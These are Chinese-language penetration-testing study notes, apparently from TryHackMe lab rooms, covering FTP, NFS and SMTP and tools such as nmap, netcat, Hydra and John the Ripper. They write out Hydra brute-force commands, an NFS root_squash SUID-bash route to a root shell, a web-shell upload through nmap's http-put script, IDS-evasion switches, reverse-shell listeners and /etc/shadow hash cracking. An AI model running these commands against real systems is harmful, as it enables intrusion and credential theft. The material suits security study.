这种指挥分离 信息和数据进入不同的渠道是一种能够 向服务器发送命令，无需 等待当前数据传输完成。 如果两个通道都是 相互链接，您只能在数据传输之间输入命令，这对于大文件传输或缓慢的互联网连接来说效率不高。 



**利用 FTP** 

FTP 漏洞利用的类型 

与 Telnet 类似，使用时 FTP 的命令和数据通道均未加密。 发送的任何数据通过这些通道可以被拦截和读取。由于 FTP 的数据以明文形式发送，如果发生中间人攻击，攻击者可以泄露通过该协议发送的任何内容（例如密码）。 撰写的一篇文章 JSCape 演示并解释了使用 ARP 中毒欺骗受害者向攻击者而不是合法来源发送敏感信息的过程。

当从我们在这台机器上所处的位置查看 FTP 服务器时，我们可以利用的途径是弱密码配置或默认密码配置。

方法细目

所以，从我们的枚举阶段，我们知道：

有一个 FTP服务器正在运行 -本机上

- 我们有一个可能的用户名

使用此信息，让我们尝试暴力破解FTP服务器的密码 。

Hydra

Hydra 是一款非常快速的在线密码破解工具，它可以对 50 多种协议执行快速字典攻击，包括 Telnet、RDP、SSH、FTP、HTTP、HTTPS、SMB、多种数据库等等。 Parrot 和 Kali 上默认都有 Hydra，但是如果您需要它，可以在此处找到(https://github.com/vanhauser-thc/thc-hydra) 。

我们将用来查找密码的命令的语法如下：
“Hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp”

让我们来分解一下部分功能：

Hydra    运行 Hydra 工具

-t 4    每个目标的并行连接数

-l [user]    指向您试图入侵的帐户的用户

-P [字典路径]    指向包含可能密码列表的文件

-vV    将详细模式设置为非常详细，显示每次尝试的登录+密码组合

[机器IP]    目标机器的IP地址

ftp / 协议   设置协议 





#### NFS

**NFS 代表“网络文件系统”**， 允许系统与其他系统通过网络共享目录和文件。 通过使用NFS，用户和程序可以访问远程系统上的文件几乎就像本地文件一样。 它通过在服务器上安装全部或部分文件系统来实现此目的。客户端可以通过为每个文件分配的任何权限来访问已安装的文件系统部分。**NFS 使用 RPC 协议在服务器和客户端之间进行通信**。 

**NFS 是如何工作的？** 

首先，客户端将请求将远程主机上的目录挂载到本地目录上，就像挂载物理设备一样。然后挂载服务将使用 RPC 连接到相关的挂载守护进程。服务器检查用户是否有权挂载所请求的任何目录。 然后它将返回一个文件句柄，该句柄唯一标识服务器上的每个文件和目录。如果有人想要使用 NFS 访问文件，则会向服务器上的 NFSD（NFS 守护进程）发出 RPC 调用。  此调用采用以下参数：

    文件句柄 The file handle
    要访问的文件的名称
    用户的、用户ID The user's, user ID
    用户的组ID

这些用于确定对指定文件的访问权限。这就是控制用户权限、IE 读写文件的功能。

什么运行 NFS？

使用 NFS 协议，您可以在运行 Windows 和其他非 Windows 操作系统（例如 Linux、MacOS 或 UNIX）的计算机之间传输文件。

运行 Windows Server 的计算机可以充当其他非 Windows 客户端计算机的 NFS 文件服务器。同样，NFS 允许运行 Windows Server 的基于 Windows 的计算机访问存储在非 Windows NFS 服务器上的文件。



**枚举 NFS** 

NFS-通用

为了对 NFS 服务器和共享进行更高级的枚举我们需要一些工具。 第一个是与本地计算机上的任何 NFS 共享进行交互的关键：nfs-common。

将此软件包安装在任何使用 NFS 的计算机（无论是作为客户端还是服务器）上非常重要。它包括以下程序：lockd、statd、showmount、nfsstat、gssd、idmapd 和 mount.nfs。我们主要关注showmount和mount.nfs，因为当我们从 NFS 共享中提取信息时，它们对我们最有用。如果您想了解有关此软件包的更多信息，请随时阅读：https://packages.ubuntu.com/jammy/nfs-common。

**使用 /usr/sbin/showmount -e [IP] 列出 NFS 共享**

您可以使用“sudo apt install nfs-common”来安装 nfs-common，它是大多数 Linux 发行版（例如提供给 TryHackMe 的 Kali 远程计算机或 AttackBox）的默认存储库的一部分。

**挂载 NFS 共享**

您的客户端系统需要一个目录，可以在其中访问导出文件夹中主机服务器共享的所有内容。 您可以创建该文件夹位于系统上的任何位置。 创建此挂载点后，您可以使用“mount”命令将 NFS 共享连接到计算机上的挂载点，如下所示：

**sudo mount -t nfs IP:share /tmp/mount/ -nolock**

让我们来分解一下：
标签 	功能
sudo 	以 root 身份运行
mount 	执行挂载命令
-t nfs 	要安装的设备类型，然后指定它是 NFS
IP:share 	NFS 服务器的 IP 地址以及我们希望挂载的共享的名称
-nolock 	指定不使用 NLM 锁定



**利用 NFS** 

root_squash

默认情况下，在 NFS 共享上启用根压缩，并阻止连接到 NFS 共享的任何人对 NFS 卷进行根访问。 远程 root 用户在连接时会被分配一个用户“nfsnobody”，该用户具有最低的本地权限。这不是我们想要的，但是，如果关闭此功能，则可以允许创建 SUID 位文件，从而允许远程用户根访问所连接的系统。

SUID

什么是设置了 SUID 位的文件呢？本质上，这意味着一个或多个文件可以使用文件所有者/组的权限运行。在这种情况下作为超级用户，我们可以利用它来获得具有这些权限的 shell 。

方法

这听起来很复杂，但实际上，只要您熟悉 SUID 文件的工作原理，就很容易理解。我们可以将文件上传到NFS共享，并控制这些文件的权限。  我们可以设置上传的任何内容的权限，在本例中是 bash shell 可执行文件。然后我们可以通过 SSH 登录，就像我们在上一个任务中所做的那样 - 并执行此可执行文件以获得 root shell 。

可执行文件

由于兼容性原因，我们将使用标准的 Ubuntu Server 18.04 bash 可执行文件，与服务器的相同 - 正如我们从 nmap 扫描中得知的那样。您可以在这里下载。如果你想通过命令行下载它，请注意不要下载 github 页面而不是原始脚本。 您可以使用 wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash。

规划出的路径：

如果这仍然很难理解，这里是我们正在采取的一步一步的操作，以及它们如何结合在一起以使我们获得 root shell：

NFS 访问 ->

获得低权限 Shell ->

将 Bash 可执行文件上传到 NFS 共享 ->

由于 Root Squash 配置错误，通过 NFS 设置 SUID 权限 ->

通过SSH登录 ->

执行 SUID 位 Bash 可执行文件 ->

根访问权限





#### SMTP,POP,IMAP

SMTP 代表“Simple Mail Transfer Protocol 简单邮件传输协议”。 它用于处理电子邮件的发送，默认 SMTP 端口是25。**为了支持电子邮件服务，需要一个协议对，包括 SMTP 和 POP/IMAP，它们一起允许用户发送外发邮件和分别检索传入的邮件。**

SMTP 服务器执行三个基本功能：

    它验证谁通过 SMTP 服务器发送电子邮件。
    它发送外发邮件
    如果外发邮件无法送达，则会将邮件发送回发件人 

大多数人在某些第三方电子邮件客户端（例如 Thunderbird）上配置新电子邮件地址时都会遇到 SMTP； 因为当您配置新的电子邮件客户端时，您将需要配置 SMTP 服务器配置才能发送外发电子邮件。SMTP 服务器软件可以在 Windows 服务器平台上轻松使用，并且许多其他 SMTP 变体也可以在 Linux 上运行。

**POP 和 IMAP**

POP（即“Post Office Protocol 邮局协议”）和 IMAP（“Internet Message Access Protocol 互联网消息访问协议”）都是电子邮件协议，负责在客户端和邮件服务器之间传输电子邮件。 主要区别在于 POP 更简单地将收件箱从邮件服务器下载到客户端。 IMAP 会将当前收件箱与服务器上的新邮件同步，下载任何新内容。 这意味着，如果您随后从另一台计算机同步收件箱，则通过 IMAP 对一台计算机上的收件箱所做的更改将保留。 POP/IMAP 服务器负责完成此过程。

**SMTP 是如何工作的？**

电子邮件传送功能与物理邮件传送系统非常相似。 用户将提供电子邮件（一封信）和一项服务（邮政投递服务），并通过一系列步骤-将其投递到收件人的收件箱（邮箱）。 SMTP 服务器在此服务中的作用是充当分拣办公室，电子邮件（信件）被拾取并发送到该服务器，然后由该服务器将其定向到收件人。

我们可以将电子邮件从您的计算机到收件人的路径映射如下： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231110213944948.png" alt="image-20231110213944948" style="zoom:67%;" />

1. 邮件用户代理，它可以是您的电子邮件客户端或外部程序。 连接到您所在域的 SMTP 服务器，例如 smtp.google.com。 这将启动 SMTP 握手。 此连接通过 SMTP 端口（通常为 25）进行工作。建立并验证这些连接后，SMTP 会话就会启动。

2. 现在可以开始发送邮件了。 客户端首先将发件人和收件人的电子邮件地址（电子邮件正文和任何附件）提交到服务器。

3. SMTP 服务器检查收件人和发件人的域名是否相同。

4. 发件人的 SMTP 服务器将在转发电子邮件之前与收件人的 SMTP 服务器建立连接。 如果收件人的服务器无法访问或不可用，则电子邮件将被放入 SMTP 队列中。

5. 然后，收件人的 SMTP 服务器将验证传入的电子邮件。 它通过检查域名和用户名是否已被识别来实现这一点。 然后，服务器会将电子邮件转发到 POP 或 IMAP 服务器，如上图所示。

6. 然后电子邮件将显示在收件人的收件箱中。

电子邮件最终位于POP/IMAP服务器上。这是该过程的一个非常简化的版本，还有很多子协议、通信和细节尚未包含在内。













## 4,工具



### 网络工具

#### Ping 

当我们想要测试是否可以连接到远程资源时，可以使用 ping 命令。 通常这将是互联网上的一个网站，但如果您想检查它的配置是否正确，它也可能是您家庭网络上的计算机。 **Ping 使用 ICMP 协议进行工作**，该协议是前面提到的不太知名的 TCP/IP 协议之一。 ICMP 协议工作在 OSI 模型的网络层，因此也工作在 TCP/IP 模型的网络层。 ping 的基本语法是 ping <target>。 在此示例中，我们使用 ping 来测试是否可以与 Google 建立网络连接： ping google.com 。

请注意，**ping 命令实际上返回了它所连接的 Google 服务器的 IP 地址，而不是所请求的 URL**。 这是 ping 的一个方便的辅助应用程序，因为它可用于确定托管网站的服务器的 IP 地址。 ping 的一大优点是它对于任何支持网络的设备来说几乎无处不在。 所有操作系统都开箱即用地支持它，甚至大多数嵌入式设备都可以使用 ping 。





#### Whois

Whois 本质上允许您查询域名的注册人。 在欧洲，个人信息会被编辑； 然而，在其他地方，您可能会从 whois 搜索中获得大量信息。

可以使用网络版（https://www.whois.com/whois/）如果您特别不喜欢命令行的 whois 工具。Whois 查询非常容易执行。 只需使用 whois <domain>获取有关域名注册的可用信息列表







### Nmap

Nmap 可用于执行许多不同类型的端口扫描 - 其中最常见的将在接下来的任务中介绍； 然而，基本理论是这样的：nmap 将依次连接到目标的每个端口。 根据端口的响应方式，可以将其确定为开放、关闭或过滤（通常由防火墙）。 一旦我们知道哪些端口是开放的，我们就可以查看每个端口上正在运行的服务。

网络连接在两个端口之间建立——一个在服务器上侦听的开放端口和一个在您自己的计算机上随机选择的端口。每台电脑共有65535个可用端口；但是，其中许多已注册为标准端口。例如，几乎总是可以在服务器的端口 80 上找到 HTTP Web 服务。可以在端口 443 上找到 HTTPS Web 服务。可以在端口 139 上找到 Windows NETBIOS，在端口 445 上可以找到 SMB。因此，我们从端口扫描开始任何攻击是至关重要的。这可以通过多种方式实现——通常使用名为 nmap 的工具，这是本房间的重点。Nmap 可用于执行多种不同类型的端口扫描



#### Nmap参数

Nmap 可以通过键入来访问 nmap进入终端命令行，然后是我们将在下面介绍的一些“开关”（告诉程序执行不同操作的命令参数）。为此，您所需要的只是 nmap 的帮助菜单（通过 nmap -h）或 nmap 手册页（使用以下命令访问 man nmap）。

|     参数      |                             描述                             |
| :-----------: | :----------------------------------------------------------: |
|      -sU      |                        进行“UDP 扫描”                        |
|      -O       |                 检测目标正在运行哪个操作系统                 |
|      -sV      |                  检测目标上运行的服务的版本                  |
| -p 1000-1500  |                   nmap 扫描端口 1000-1500                    |
|      -p-      |                      nmap 扫描所有端口                       |
|   --script    |                   激活 nmap 脚本库中的脚本                   |
| --script=vuln |                  激活“vuln”类别中的所有脚本                  |
|      -v       | nmap 提供的默认输出通常无法为渗透测试人员提供足够的信息，增加冗长程度详细程度一级 |
|      -vv      |                         详细程度二级                         |
|      -oA      |                 以三种主要格式保存 nmap 结果                 |
|      -oN      |                  以“正常”格式保存 nmap 结果                  |
|      -A       | 得到的结果还不够，如果我们不在乎声音有多大，我们可以启用“攻击性”模式，这是一个速记开关，用于激活服务检测、操作系统检测、跟踪路由和通用脚本扫描。 |
|      -T5      | Nmap提供了五个级别的“计时”模板，这些基本上用于提高扫描运行的速度。 但要小心：速度越高噪音越大，并且可能会产生错误，模板设置为级别 5 |





#### 扫描类型概述

使用Nmap进行端口扫描时，有三种基本扫描类型。 这些都是：

    TCP 连接扫描（ -sT）
    SYN“半开”扫描（ -sS）
    UDP 扫描（ -sU）

此外，还有几种不太常见的端口扫描类型，我们还将介绍其中一些类型（尽管不太详细）。 这些都是：

    TCP Null扫描（ -sN）
    TCP FIN 扫描（ -sF）
    TCP Xmas扫描 ( -sX）

其中大多数（UDP 扫描除外）的用途非常相似，但是每次扫描的工作方式有所不同。 这意味着，虽然在大多数情况下您可能会选择前三种扫描之一，但值得注意的是还存在其他扫描类型。 



**①TCP 连接扫描**

TCP 连接扫描通过依次与每个目标端口执行三向握手来工作。换句话说，Nmap 尝试连接到每个指定的 TCP 端口，并通过它收到的响应来确定服务是否打开。如果 Nmap 发送一个SYN标志设置为关闭端口的 TCP 请求，目标服务器将响应一个RST（重置）标志设置的 TCP 数据包。通过此响应，Nmap 可以确定端口已关闭。但是，如果请求发送到开放端口，目标将使用设置了 SYN/ACK 标志的 TCP 数据包进行响应。Nmap 然后将此端口标记为打开（并通过发回设置了 ACK 的 TCP 数据包来完成握手）。

 

**②SYN 扫描**

与 TCP 扫描一样，SYN 扫描 ( -sS) 用于扫描一个或多个目标的 TCP 端口范围；但是，这两种扫描类型的工作方式略有不同。SYN 扫描有时称为“半开”扫描或“隐形”扫描。在 TCP 扫描与目标执行完整的三向握手的情况下，SYN 扫描在从服务器收到 SYN/ACK 后发回 RST TCP 数据包（这可以防止服务器重复尝试发出请求）。

 

**③UDP 扫描**

与 TCP 不同，UDP 连接是无状态的。这意味着，UDP 连接不是通过来回“握手”来启动连接，而是依赖于将数据包发送到目标端口并基本上希望它们能够成功。这使得 UDP 非常适合依赖速度而不是质量的连接（例如视频共享），但是缺乏确认使得 UDP 扫描起来非常困难（并且慢得多）。Nmap UDP 扫描的开关是 ( -sU)。当数据包发送到开放的 UDP 端口时，应该没有响应。发生这种情况时，Nmap 将该端口称为open|filtered. 换句话说，它怀疑端口是开放的，但它可能被防火墙保护了。如果它收到 UDP 响应（这是非常不寻常的），则该端口被标记为open。更常见的是没有响应，在这种情况下，将再次发送请求作为复查。如果仍然没有响应，则该端口被标记为打开|已过滤并且 Nmap 继续。当一个数据包被发送到一个关闭的UDP 端口时，目标应该用一个 ICMP (ping) 数据包来响应，其中包含一个端口无法访问的消息。这清楚地标识了关闭的端口，Nmap 将其标记为关闭端口并继续前进。

 

**④ICMP 网络扫描**

扫描类型ICMP 网络扫描

在黑盒分配中首次连接到目标网络时，我们的首要目标是获取网络结构的“地图”——或者换句话说，我们想查看哪些 IP 地址包含活动主机，哪些不包含。一种方法是使用 Nmap 执行所谓的“ping 扫描”。这正是顾名思义：Nmap 向指定网络的每个可能的 IP 地址发送一个 ICMP 数据包。当它收到响应时，它会将响应的 IP 地址标记为活动的。由于我们将在后面的任务中看到的原因，这并不总是准确的；但是，它可以提供一些基线，因此值得介绍。要执行 ping 扫描，我们将-sn开关与 IP 范围结合使用，IP 范围可以用连字符 ( -) 或 CIDR 表示法指定。即我们可以192.168.0.x使用以下方式扫描网络：

nmap -sn 192.168.0.1-254

或者

nmap -sn 192.168.0.0/24

开关-sn告诉 Nmap 不要扫描任何端口——迫使它主要依靠 ICMP 回显数据包（或本地网络上的 ARP 请求，如果使用 sudo 运行或直接以 root 用户身份运行）来识别目标。除了 ICMP 回显请求外，-sn交换机还会使 nmap 向目标的端口 443 发送 TCP SYN 数据包，以及向目标的端口 80 发送 TCP ACK（或 TCP SYN，如果不是以根用户身份运行）数据包





#### NSE脚本

The Nmap Scripting Engine(NSE) 是对 Nmap的一个非常强大的补充，大大扩展了它的功能。NSE 脚本是用Lua编程语言编写的，可用于执行多种操作：从扫描漏洞到自动利用漏洞。NSE 对于侦察特别有用，但是，值得牢记脚本库的广泛性，有很多类别可用。

有很多类别可供选择。 一些有用的类别包括：

    safe:- 不会影响目标
    intrusive：- 不安全：可能会影响目标
    vuln:- 扫描漏洞
    exploit:- 尝试利用漏洞
    auth:- 尝试绕过正在运行的服务的身份验证（例如匿名登录 FTP 服务器）
    brute:- 尝试暴力破解运行服务的凭据
    discovery:- 尝试查询正在运行的服务以获取有关网络的更多信息（例如查询 SNMP 服务器）。 

找到更详尽的列表可以在此（https://nmap.org/book/nse-usage.html） 。 



**使用 NSE 脚本**

要运行特定脚本，我们将使用--script=<script-name>，例如--script=http-fileupload-exploiter。

多个脚本可以通过用逗号分隔以这种方式同时运行。例如：--script=smb-enum-users,smb-enum-shares。

一些脚本需要参数（例如，凭据，如果它们正在利用经过身份验证的漏洞）。这些可以用 Nmap 开关给出--script-args。这方面的一个例子是http-put脚本（用于使用 PUT 方法上传文件）。这需要两个参数：将文件上传到的 URL 和文件在磁盘上的位置。例如：

nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'

请注意，参数以逗号分隔，并使用句点（即 <script-name>.<argument>）连接到相应的脚本。

Nmap 脚本带有内置帮助菜单，可以使用以下命令访问 nmap --script-help <script-name>。



**搜索 NSE 脚本**

我们知道如何使用 Nmap 中的脚本，但我们还不知道如何找到这些脚本。为此，我们有两种选择，理想情况下应将它们结合使用。第一个是Nmap 网站上的页面（https://nmap.org/nsedoc/），其中包含所有官方脚本的列表。第二个是攻击机器上的本地存储。Nmap 在Linux上将其脚本存储在/usr/share/nmap/scripts 默认情况下，所有 NSE 脚本都存储在这个目录中——这是 Nmap 在您指定脚本时查找脚本的地方。

有两种方法可以搜索已安装的脚本。一种是使用/usr/share/nmap/scripts/script.db文件。尽管有扩展名，但它实际上并不是一个数据库，而是一个格式化的文本文件，其中包含每个可用脚本的文件名和类别。

Nmap 使用此文件来跟踪（和使用）脚本引擎的脚本；但是，我们也可以通过grep来查找脚本。例如：grep "ftp" /usr/share/nmap/scripts/script.db。

搜索脚本的第二种方法非常简单，就是使用命令ls。例如，我们可以使用以下命令获得与上一个屏幕截图相同的结果ls -l /usr/share/nmap/scripts/*ftp*  请注意在搜索词的两边使用星号( *)，同样的技术也可用于搜索脚本类别。例如：

grep "safe" /usr/share/nmap/scripts/script.db





#### 防火墙规避

我们已经看到了一些绕过防火墙的技术（想想隐形扫描，以及 NULL、FIN 和 Xmas 扫描）；然而，还有另一种非常常见的防火墙配置，我们必须知道如何绕过它。您的典型 Windows 主机将使用其默认防火墙阻止所有 ICMP 数据包。这就提出了一个问题：不仅我们经常使用ping来手动建立目标的活动，Nmap 默认情况下也做同样的事情。这意味着 Nmap 会将具有此防火墙配置的主机注册为死主机，并且根本不会扫描它。

因此，我们需要一种方法来绕过此配置。幸运的是，Nmap 为此提供了一个选项：-Pn，它告诉 Nmap 在扫描主机之前不要费心 ping 主机。这意味着 Nmap 将始终将目标主机视为活着，从而有效地绕过 ICMP 块；然而，它的代价是可能需要很长时间才能完成扫描（如果主机真的死了，那么 Nmap 仍会检查并仔细检查每个指定的端口）。

值得注意的是，如果您已经直接在本地网络上，Nmap 还可以使用ARP请求来确定主机活动。

Nmap 认为还有许多其他开关可用于规避防火墙。我们不会详细介绍这些内容，但是可以在https://nmap.org/book/man-bypass-firewalls-ids.html找到它们。

以下开关需要特别注意：

-f:- 用于将数据包分段（即将它们分成更小的部分），从而降低数据包被防火墙或IDS检测到的可能性。

-f的替代方法，但提供了对数据包大小的更多控制：--mtu <number>，接受最大传输单元大小以用于发送的数据包。这必须是 8 的倍数。

--scan-delay <time>ms:- 用于在发送的数据包之间添加延迟。这在网络不稳定的情况下非常有用，而且还可以用于规避任何可能存在的基于时间的防火墙/IDS 触发器。

--badsum:- 这用于生成数据包的无效校验和。任何真正的 TCP/IP 堆栈都会丢弃此数据包，但是，防火墙可能会自动响应，而无需检查数据包的校验和。因此，此开关可用于确定是否存在防火墙/IDS。





### Netcat

当涉及任何类型的网络时，Netcat 是渗透测试人员工具包中最基本的工具。  有了它，我们可以做各种各样有趣的事情，但现在让我们关shell。 

反向shell 

我们看到反向 shell 需要 shell代码和侦听器。执行 shell 的方法有很多种，因此我们可以从查看侦听器开始。 

使用 Linux 启动 netcat 侦听器的语法如下： 

**nc -lvnp <端口号>** 

意义： 

    -l 用于告诉netcat这将是一个侦听器 
    
    -v 用于请求详细输出 
    
    -n 告诉netcat不要解析主机名或使用DNS 
    
    -p 表示遵循端口规范 

之前的示例使用端口 443 。实际上，您可以使用任何您喜欢的端口，只要它未被使用即可。如果您选择低于 1024 的端口，则需要使用“  sudo  ”来启动它。然而，使用众所周知的端口号（例如 80 、443 或 53  ）通常是一个好主意，因为它们更有可能通过目标上的出站防火墙规则。 

一个可行的例子是： 

sudo nc -lvnp 443 

我们可以使用任意数量的有效负载连接回此，具体取决于目标上的环境。 

**绑定shell**

如果我们希望在目标上获得绑定 shell，那么我们可以假设已经有一个侦听器在所选端口上等待我们 - 我们需要做的就是连接到它。 

语法相对简单： 

nc [IP] [端口] 

在这里，我们使用 Netcat 在所选端口上建立到目标的出站连接。 





### Burip Suit

Burp Suite 是一个用 Java 编写的框架，旨在为 Web 应用程序渗透测试提供一站式服务。 在很多方面，这个目标都实现了，因为 Burp 是用于实际 Web 应用程序安全评估的行业标准工具。 Burp Suite 在评估移动应用程序时也非常常用，因为它对 Web 应用程序测试相同功能几乎可以完美地转化为测试为大多数移动应用程序提供支持的 API（pplication Programming Interfaces 应用程序编程接口）。



#### Burp 社区功能 

虽然与专业版相比，Burp Community 的功能集相对有限，但它仍然拥有许多出色的工具可用。 这些包括：

    Proxy代理 ： BurpSuite最著名的方面是Proxy，它允许我们在与Web应用程序交互时拦截和修改请求/响应。
    Repeater中继器 ： Repeater第二个最著名的Burp功能，允许我们多次捕获、修改然后重新发送相同的请求。这个功能绝对是无价的，特别是当我们需要通过反复试验来制作有效负载时（例如在 SQLi——结构化查询语言注入中）或测试端点的功能是否存在缺陷时。
    Intruder入侵 ： 尽管Burp社区有严格的速率限制，但Intruder允许我们向端点发送请求，这通常用于暴力攻击或模糊端点。
    Decoder解码器 ： 尽管解码器比前面提到的功能使用较少，但在转换数据时仍然提供有价值的服务 - 无论是解码捕获的信息，还是在将有效负载发送到目标之前对其进行编码。
    Comparer比较器 ： 顾名思义，Comparer允许我们在字或字节级别比较两个数据。
    Sequencer ： 在评估令牌的随机性（例如会话cookie值或其他假定随机生成的数据）时，我们通常使用Sequencer。如果算法没有生成安全的随机值，那么这可能会为攻击开辟一些毁灭性的途径。 







### Hydra

使用 Hydra 时有广泛的可定制性，并且它允许针对许多不同服务（包括 SSH）进行自适应密码攻击。但是如果您需要它，您可以在这里(https://github.com/vanhauser-thc/thc-hydra) 。

Hydra 主要使用字典攻击，Kali Linux 和 Parrot OS 在“ /usr/share/wordlists ”目录中都有许多不同的单词列表，如果您想找到与广泛使用的“rockyou.txt”不同的单词列表。 同样，我建议查看 SecLists 以获得更广泛的其他单词列表，这些单词列表对于各种目的都非常有用，而不仅仅是密码破解。 例如子域枚举

我们将用来查找密码的命令的语法如下：
**Hydra -t 16 -l 用户名 -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh**

让我们来分解一下： 

|     部分      |                         功能                          |
| :-----------: | :---------------------------------------------------: |
|     hydra     |                    运行 Hydra 工具                    |
|     -t 16     |                 每个目标的并行连接数                  |
|   -l [用户]   |              指向您试图入侵的帐户的用户               |
| -P [字典路径] |              指向包含可能密码列表的文件               |
|      -vV      | 将详细模式设置为非常详细，显示每次尝试的登录+密码组合 |
|   [机器IP]    |                   目标机器的IP地址                    |
|  ssh / 协议   |                       设置协议                        |





###  John

John the Ripper 是一个非常流行的哈希破解工具。它速度非常快，可以处理大量的哈希类型。

**哈希 Hash**

哈希是哈希函数的输出，它将任意长度的数据转换为另一种具有固定长度的形式（取决于所使用的哈希函数）。 这样做是为了隐藏数据的原始值，因此它经常被用来“隐藏”密码。 有许多流行的哈希算法，例如 MD4、MD5、SHA1 和 NTLM。

如果我们采用“tryhackme”并通过 MD5 哈希算法运行它，我们最终会得到输出：5957aced018cad6f7b27101c9ac2437d。 长度为 32 个字符，这是 MD5 哈希值的标准。 其他哈希算法返回不同长度的哈希值。

哈希算法只能以一种方式运行，并且不能简单地逆转。 这并不意味着破解哈希值是不可能的。 要破解哈希，您需要知道所使用的哈希算法。 您可以选择算法来散列大量的单词。然后，您可以将其与您拥有的密码哈希进行比较。如果幸运的话，您可以在您创建的哈希“字典”中找到该哈希。 然后你就知道密码了。

John the Ripper 使用类似的方法对大量不同的哈希类型进行快速暴力攻击。 



#### John使用

**单词表 Wordlists**

单词列表只是一长串单词，可用于各种用例。就john而言，我们可以通过将散列密码与大量单词进行比较来使用它们来破解散列。

在 Parrot 和 Kali Linux上，您可以在 /usr/share/wordlists 目录中找到许多有用的单词列表。 其中最著名的是“rockyou.txt”，它由 2009 年在一个名为 rockyou.com 的网站上的数据泄露事件中获得的常见密码组成。

**语法** 

让我们看看如何使用john。John the Ripper命令的基本语法如下：

john [选项] [要哈希的文件路径] 

但要以最简单的形式运行 john，我们需要指定一个单词列表：

john --wordlist=[单词列表的路径] [哈希文件的路径] 

John足够聪明，能够检测到给出的哈希类型。如果您知道使用了什么哈希算法，则可以使用格式标志：

john  --wordlist=[单词列表的路径]  --format=[格式标识符]  [哈希文件的路径] 

将它们与示例值放在一起，您将得到以下结果：

john --wordlist=/usr/share/wordlists/rockyou.txt  --format=md5  hash.txt 

**哈希识别**

虽然 john 通常足够聪明，可以识别所使用的哈希值，但 john 也有可能犯错误或识别出现问题。 正如之前提到的，我们可以使用格式标志来帮助约翰解决这个问题。 但我们如何知道使用了哪个哈希呢。以下网站（https://hashes.com/en/tools/hash_identifier?source=post_page-----75331d14748c--------------------------------），或者，存在命令行工具，例如 hash-identifier（https://www.kali.org/tools/hash-identifier/?source=post_page-----75331d14748c--------------------------------）



#### **例子**

##### **破解受密码保护的 Zip 文件**

是时候尝试破解受密码保护的 zip 文件了。 为此，我们需要 John 工具箱中的一个工具将 zip 文件转换为 John 可以理解的文件。

我们将使用的工具称为 zip2john。 基本用法是这样的：

zip2john [options] [zip file] > [output file]

运行此命令后，我们将得到一个哈希文本文件，可以在 john 中使用，就像我们已经做过很多次一样。

john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt



##### **破解 /etc/shadow 哈希值**

Windows 上 SAM 数据库的 Linux 替代方案是 /etc/shadow 文件。 其中包含密码哈希值以及其他信息，例如密码更改日期和到期信息。 该文件通常只能由 root 用户访问，因此您必须获得足够的权限。

为了让 John 了解如何破解 /etc/shadow 密码，还需要提供 /etc/passwd 文件。 如果您不记得了，该文件会跟踪有权访问系统的所有用户。

在 john 之上构建了一个可以帮助我们的工具，称为 unshadow。 它可以这样使用：

unshadow [path to passwd file] [path to shadow file] > unshadowed.txt

运行 unshadow 后，我们现在将输出保存在名为 unshadowed.txt 的文件中。  同样，您可能不需要向 john 提供输入格式 (-format)，但在某些情况下可能有必要。

etchashes.txt文件内容如下： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113215219383.png" alt="image-20231113215219383" style="zoom:67%;" />

倒数第二行包含etc/passwd/ 的内容。 etc/shadow 的内容在最后一行。 这是了解 /etc/shadow 文件的重要资源： 

正如您所读到的，哈希值以 $6$ 开头，这向我们指出了 SHA-512 哈希格式。 让我们从使用 unshadow 开始。 在执行此操作之前，我们需要将这两行插入到单独的文件中，如下所示：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113215334242.png" alt="image-20231113215334242" style="zoom:67%;" />

现在我们准备运行 unshadow：

unshadow passwd shadow > unshadowed.txt

通过运行 john 来遵循此操作：

john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt 



##### John 破解 SSH 密钥

我们将使用的具体工具称为 SSH2John，它将把 id_rsa 私钥转换为哈希格式。 语法与以前类似。

ssh2john [id_rsa private key file] > [output file]

其次是：

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt

注意：就我而言，我没有安装 ssh2john。 作为替代方案，您可以使用位于 /opt/john/ssh2john.py 的 python 脚本：

python3 /opt/ssh2john.py

例如：

python3 /opt/john/ssh2john.py id_rsa.id_rsa > hashedkey.txt 

john --wordlist=/usr/share/wordlists/rockyou.txt hashedkey.txt 



#### 单破解模式

在前面的练习中，我们一直使用约翰的单词表模式。 但还有另一种模式：单破解模式。 本质上，此模式使用用户的用户名、全名或主目录来尝试找出密码。 例如，它通过更改用户名中的字母和数字来实现此目的。

让我们看一个用户名 Markus 的示例：

一些可能的密码可能是：

        Markus1, Markus2, Markus3 (etc.)
        MArkus, MARkus, MARKus (etc.)
        Markus!, Markus$, Markus* (etc.) 

这种技术称为单词重整。john根据用户的信息创建了一个新的单词列表。这是利用了基于用户名信息的不良密码的可能性。

如前所述，除了用户名之外，还可以在修改中使用其他信息。 它通过读取所谓的 Gecos 字段来实现这一点。 /etc/shadow 和 /etc/passwd 文件都包含这些 Gecos 字段（用冒号 (:) 分隔），john 可以利用这些字段添加到单词列表中。

要使用单一破解模式，命令与我们之前看到的非常相似：

john --single --format=[format] [path to file]

所以你只需要添加 — single标志。

注意：使用单一破解模式时，需要在哈希值前面添加该哈希值所属的用户名。

**尝试破解附加到 THM 房间的哈希值。 它属于一个名为“Joker”的用户。** 

让我们首先将用户名和哈希值一起添加到文件中。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113220118831.png" alt="image-20231113220118831" style="zoom:67%;" />

在 hashes.com 上识别哈希类型将哈希类型识别为 MD5，用 john 来破解：john --single --format=raw-md5 hash7 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113220244681.png" alt="image-20231113220244681" style="zoom:50%;" />











# 二，漏洞



## OWASP TOP10

    1.注入Injection
    2.失效的身份认证Broken Authentication
    3.敏感数据暴露Sensitive Data Exposure
    4.XML外部实体XML External Entity
    5.失效的访问控制Broken Access Control
    6.安全配置错误Security Misconfiguration
    7.跨站脚本Cross-site Scripting（XSS）
    8.不安全的反序列化Insecure Deserialization
